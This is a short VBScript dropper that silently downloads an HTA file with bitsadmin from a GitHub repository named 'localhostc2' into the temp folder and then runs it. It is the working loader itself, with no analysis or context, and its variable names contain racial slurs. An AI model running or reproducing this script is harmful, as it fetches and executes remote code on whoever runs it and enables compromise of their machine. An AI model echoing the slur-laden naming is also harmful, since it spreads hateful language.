set nigguashd = CreateObject("WScript.Shell")
Dim chinksduyq
chinksduyq = "%Temp%" & "\A.hta"
const DontWaitUntilFinished = false, ShowWindow = 1, DontShowWindow = 0, WaitUntilFinished = true
nigguashd.Run "bitsadmin /transfer 8 https://github.com/ashduasdoasdoasd/localhostc2/raw/refs/heads/main/A.hta " & chinksduyq, DontShowWindow, WaitUntilFinished
nigguashd.Run chinksduyq
Close